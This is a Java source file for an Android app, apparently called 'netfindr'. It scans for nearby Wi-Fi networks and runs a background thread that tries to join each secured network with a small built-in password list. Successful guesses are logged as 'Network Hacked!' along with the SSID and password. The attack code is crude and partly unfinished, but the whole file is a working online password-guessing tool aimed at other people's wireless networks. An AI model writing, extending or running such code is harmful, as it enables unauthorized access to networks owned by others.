package nz.frontdoor.netfindr;

import android.app.IntentService;
import android.content.BroadcastReceiver;
import android.content.Intent;
import android.content.Context;
import android.content.IntentFilter;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.util.Log;
import android.widget.Toast;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.InterruptedIOException;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.CountDownLatch;

/**
 * An {@link IntentService} subclass for handling asynchronous task requests in
 * a service on a separate handler thread.
 * <p/>
 * TODO: Customize class - update intent actions, extra parameters and static
 * helper methods.
 */
public class WifiService extends IntentService {
    private static final String TAG = "WIFISERVICE";
    public static Context context;

    private List<ScanResult> networks;
    private List<String> seenSSID;

    private WifiManager wifi;
    private BroadcastReceiver wifiScanReciver;
    private BroadcastReceiver wifiConnectionReciver;

    private ScanResult current;
    private CONNECTION_ATTEMPT_RESULT currentRes;
    private ThreadEvent scanComplete = new ThreadEvent();

    private enum CONNECTION_ATTEMPT_RESULT {
        SUCCESS,
        FAILURE,
    }

    private enum SECURITY_TYPE {
        WPA2,
        WPA,
        WEP,
        NONE
    }

    public WifiService() {
        super("WifiService");
        Log.v(TAG, "Service Created");

        networks = new ArrayList<>();
        seenSSID = new ArrayList<>();
        new SUPRHackrThrd().execute();


        wifi = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
        wifiScanReciver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                List<ScanResult> scanResults;

                synchronized (wifi) {
                    scanResults = wifi.getScanResults();
                }

                int u = 0;
                synchronized (networks) {
                    for (ScanResult r : scanResults) {

                        // TMP
                        boolean e = false;
                        for (ScanResult n : networks) {
                            if (n.SSID.equals(r.SSID)) {
                                e = true;
                            }
                        }

                        if (!e && !seenSSID.contains(r.SSID)) {
                            networks.add(r);
                            u++;
                        } else {
                            seenSSID.add(r.SSID);
                        }
                    }

                    Log.v(TAG, "Scan Completed -> " + scanResults.size() + " networks found, " + u + " uniquic. [total = " + networks.size() + "]" );
                }
            }
        };
        context.registerReceiver(wifiScanReciver, new IntentFilter(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION));

        wifiConnectionReciver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                try {
                    Thread.sleep(3500);
                } catch (InterruptedException e) {

                }

                ConnectivityManager conMan = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
                NetworkInfo netInfo = conMan.getActiveNetworkInfo();

                if (netInfo != null) {
                    Log.v("", "");
                }

                if (netInfo != null && netInfo.getType() == ConnectivityManager.TYPE_WIFI) {
                    // HAKED
                    currentRes = CONNECTION_ATTEMPT_RESULT.SUCCESS;
                } else {
                    // NOT HAKED
                    currentRes = CONNECTION_ATTEMPT_RESULT.FAILURE;

                }

                scanComplete.signal();
            }
        };
        context.registerReceiver(wifiConnectionReciver, new IntentFilter(WifiManager.SUPPLICANT_STATE_CHANGED_ACTION));
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        if (intent != null) {
            final String action = intent.getAction();
            Log.v(TAG, "Action Recived: " + action);

            if (wifi.isWifiEnabled() == false) {
                Log.v(TAG, "Wifi was disabled... Enabling");
                Toast.makeText(context, "Wifi is Disabled... Enabling", Toast.LENGTH_LONG).show();
                wifi.setWifiEnabled(true);
            }

            scan();
        }
    }

    public int connect() {
        WifiConfiguration wifiConfiguration = new WifiConfiguration();

        return 0;
    }

    public void scan() {
        // Start a peroic scan
        boolean s = wifi.startScan();
        Log.v(TAG, "Scan Status -> " + s);
    }

    private class SUPRHackrThrd extends AsyncTask<Void, Void, Void> {
        String[] passwords = new String[] {"password", "password1"};

        @Override
        protected Void doInBackground(Void... params) {

            while (true) {
                ScanResult sr = null;
                synchronized (networks) {
                    if (!networks.isEmpty()) {
                        sr = networks.remove(0);
                    }
                }

                // Set the current network being looked at
//                synchronized (current) {
//                    current = sr;
//                }

                if (sr == null) {
                    Log.v(TAG, "No networks to HAK... sleeping");
                    try {
                        Thread.sleep(10000, 0);
                        continue;
                    } catch (Exception e) {

                    }
                }

                Log.v(TAG, "Scanning Network -> " + sr.SSID);

                SECURITY_TYPE security_type = getSecurityType(sr);
                Log.d(TAG, "Network Security -> " + security_type.toString());

                if (security_type == SECURITY_TYPE.NONE) {
                    Log.v(TAG, "Skipping Network... No Security");
                    continue;
                }

                for (String password : passwords) {
                    WifiConfiguration wifiConfiguration = new WifiConfiguration();
                    wifiConfiguration.SSID = String.format("\"%s\"", sr.SSID);
                    wifiConfiguration.preSharedKey = String.format("\"%s\"", password);
                    wifiConfiguration.status = WifiConfiguration.Status.ENABLED;

                    int id = -1;
                    synchronized (wifi) {
                        id = wifi.addNetwork(wifiConfiguration);
                        boolean disconnect = wifi.disconnect();
                        boolean enabled = wifi.enableNetwork(id, true);
                        boolean reconnected = wifi.reconnect();
                    }


                    try {
                        scanComplete.await();
                    } catch(InterruptedException e) {
                        throw new RuntimeException();
                    }

                    wifi.removeNetwork(id);
                    if (currentRes == CONNECTION_ATTEMPT_RESULT.SUCCESS) {
                        Log.v(TAG, "Network Hacked!, SSID -> " + sr.SSID + ", password -> " + password);
                        break;
                    } else {
                        Log.v(TAG, "Network Not Hacked, SSID -> " + sr.SSID + ", password -> " + password);
                    }
                }
            }

            //return null;
        }
    }

    private static SECURITY_TYPE getSecurityType(ScanResult s) {
        String c = s.capabilities;

        if (c.contains("WPA2")) {
            return SECURITY_TYPE.WPA2;
        } else if (c.contains("WPA")) {
            return SECURITY_TYPE.WPA;
        } else if (c.contains("WEP")) {
            return SECURITY_TYPE.WEP;
        }

        return SECURITY_TYPE.NONE;
    }
}
